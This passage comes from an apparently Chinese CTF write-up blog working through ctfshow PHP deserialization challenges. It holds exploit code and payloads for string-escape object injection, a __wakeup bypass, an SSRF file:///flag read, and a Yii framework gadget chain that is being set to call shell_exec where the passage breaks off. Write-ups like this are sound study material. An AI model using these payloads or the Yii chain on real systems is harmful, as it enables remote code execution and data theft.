class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;tr1ple&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;aaaaax&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));<span class="comment">#输出一个序列化后的$use=a:2:&#123;i:0;s:6:&quot;tr1ple&quot;;i:1;s:6:&quot;aaaaax&quot;;&#125;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));<span class="comment">#经过过滤将x过滤为zz s:6:&quot;aaaaazz&quot;;s的长度会发生改变  valueName = &quot;a:2:&#123;i:0;s:6:&quot;tr1ple&quot;;i:1;s:6:&quot;aaaaazz&quot;;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure><p>php特性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 &#125; 作为结尾(字符串除外)，并且是根据长度判断内容的</span><br><span class="line">2.对类中不存在的属性也会进行反序列化</span><br></pre></td></tr></table></figure><p>以上代码就明显存在一个问题，即从序列化后的字符串中明显可以看到经过filter函数以后s:6对应的字符串明显变长了.并且如果对于a:2:{i:0;s:6:”tr1ple”;i:1;s:5:”aaaaa”;}i:1;s:5:”aaaaa”; 这种字符串而言，也能够正常反序列化，说明php在反序列化的时候只要求一个反序列化字符串块合法即可，当然得是第一个字符串块</p><p>以以上代码为例，如果能够利用filter函数这种由一个字符变为两个字符的特性来注入想要反序列化后得到的属性，使其可以逃逸出更多可用的字符串，那么我们就能反序列化得到我们想要的属性</p><p>比如此时我们想要让反序列化后第二个字符串为123456，此时我们的payload如果和之前的username长度为a，则filter处理以后可能username就会变成a，此时我们的payload变成了新的注入的属性，此时反序列化后就会得到我们想要的结果，比如a:2:{i:0;s:6:”tr1ple”;i:1;s:6:”123456”;}是我们想要达到的效果，此时我们想要注入的payload明显为：</p><p>“;i:1;s:6:”123456”;}</p><p>可以得到其长度为20</p><p>此时我们已经知道过滤的规则为x-&gt;yy，即注入一个x可以逃逸出一个字符的空位，那么我们只需要注入20个x即可变成40个y，即可逃逸出20个空位，从而将我们的payload变为反序列化后得到的属性值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;a:2:&#123;i:0;s:6:&quot;tr1ple&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;i:1;s:6:&quot;aaaaa1&quot;;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;tr1plexxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#x27;</span>; <span class="comment">//其中红色就是我们想要注入的属性值</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;aaaaa&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">array</span>(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$r</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$r</span>));</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line"><span class="comment">#header(&quot;Content-type: text/html; charset=utf-8&quot;);</span></span><br><span class="line"><span class="comment">#highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="variable language_">$this</span>-&gt;hint = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable language_">$this</span>-&gt;hint));</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable language_">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123;</span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$t1</span>=<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&#x27;a&quot;;s:8:&quot;password&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">//$r1 = new evil(&#x27;hint.php&#x27;);</span></span><br><span class="line"><span class="comment">//echo (serialize($r1));# O:4:&quot;evil&quot;:1:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;绕过wakeup函数变为O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span></span><br><span class="line"><span class="comment">#O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:24:&quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:2:&quot;11&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;&quot;;&#125;&#x27;</span>));</span><br></pre></td></tr></table></figure><p>我们重点看到的是两个类，在evil类里$this-&gt;hint指向文件触发file_get_contents函数读取文件内容，然后提示有个hint.php，肯定要构造触发这个evil类，但是看接入点，是post进去username和password两个参数，然后触发的是User类，但是有个read和write方法，经过处理后才进行序列化，这个就是个典型的字符串逃逸，具体原理可以参考文章PHP字符逃逸导致的对象注入<br>我们要逃逸出发evil类的payload为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;hint&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;hint.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>user类触发为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">41</span>:<span class="string">&quot;O:4:&quot;</span>evil<span class="string">&quot;:1:&#123;s:4:&quot;</span>hint<span class="string">&quot;;s:8:&quot;</span>hint.php<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><p>所以我们要逃逸的就是”;s:8:”password”;s:41:”共23个字符，然后一对\0\0\0可以逃逸三个字符，我们就再添一个a进去凑成24个，用8对进行逃逸，但是会触发wakeup函数，使我们的hint指向一个颜文字，利用wakeup函数漏洞，将属性个数从1改成2即可绕过，最终构造的payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;password=a&quot;;O:4:&quot;evil&quot;:2:&#123;s:4:&quot;hint&quot;;s:8:&quot;hint.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p>得到一个</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接访问index.cgi</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;args&quot;: &#123;</span><br><span class="line">    &quot;name&quot;: &quot;Bob&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;headers&quot;: &#123;</span><br><span class="line">    &quot;Accept&quot;: &quot;*/*&quot;, </span><br><span class="line">    &quot;Host&quot;: &quot;httpbin.org&quot;, </span><br><span class="line">    &quot;User-Agent&quot;: &quot;curl/7.64.0&quot;, </span><br><span class="line">    &quot;X-Amzn-Trace-Id&quot;: &quot;Root=1-620a1f2c-4d7449205354f22625cdf096&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  &quot;origin&quot;: &quot;114.67.175.224&quot;, </span><br><span class="line">  &quot;url&quot;: &quot;http://httpbin.org/get?name=Bob&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现是通过get方法获取name的值</p><p>发现后面请求的name确实跟着变了，证明猜测成立 ，那就来ssrf读取flag<br> 这里需要一个file协议<br> <a href="https://blog.csdn.net/shadow_zed/article/details/80526965?ops_request_misc=%7B%22request_id%22:%22162045587016780264076286%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=162045587016780264076286&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-80526965.first_rank_v2_pc_rank_v29&utm_term=file%E5%8D%8F%E8%AE%AE">file协议</a><br> 所以构造payload</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">?name= file:<span class="comment">///flag</span></span><br></pre></td></tr></table></figure><h1 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token=<span class="variable">$t</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token===<span class="variable language_">$this</span>-&gt;password;<span class="comment">#如果token等于密码,这里很明显如果不是一个数是不可能的,但是可以使用引用</span></span><br><span class="line">        <span class="comment">#也可以理解成别名,给token取一个别名为password两者就是同一个数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line"><span class="variable">$ctfshow</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());<span class="comment">#给这个对象的token赋值随机整数的md5值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctfshow</span>-&gt;<span class="title function_ invoke__">login</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mt_rand() 使用 Mersenne Twister 算法返回随机整数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowAdmin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = &amp;<span class="variable language_">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">ctfshowAdmin</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"><span class="comment">#O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3BN%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D</span></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406182322292.png" alt="image-20220406182322292"></p><h1 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">  Author: h1xa</span></span><br><span class="line"><span class="comment">  Date:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment">  Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment">  Last Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment">  email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment">  link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$final</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:7:&quot;ctfshow&quot;:0:&#123;&#125;</span></span><br><span class="line"><span class="comment">#O%3A7%3A%22ctfshow%22%3A0%3A%7B%7D</span></span><br></pre></td></tr></table></figure><p>但是这输入的时候是不能含有ctfshow的,新版hackbar有问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;Ctfshow&quot;:0:&#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:7:&quot;ctfshow&quot;:0:&#123;111&#125;</span><br></pre></td></tr></table></figure><p>第二种推测可能是反序列化之后出现问题,对象就直接被销毁了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406183742575.png" alt="image-20220406183742575"></p><h1 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406184313127.png" alt="image-20220406184313127"></p><p>我还以为开错环境了</p><p>login页面出来是yii框架</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406184822593.png" alt="image-20220406184822593"></p><p>admin  admin登录了</p><p>about页面才出现提示</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406184941640.png" alt="image-20220406184941640"></p><p>about页面传参数</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406185055199.png" alt="image-20220406185055199"></p><h2 id="yii框架利用链"><a href="#yii框架利用链" class="headerlink" title="yii框架利用链"></a>yii框架利用链</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</span></span><br></pre></td></tr></table></figure><p>访问一下backdoor文件</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220406185710589.png" alt="image-20220406185710589"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;shell_exec&#x27;</span>;</span><br><span class="line">            <span class="variable 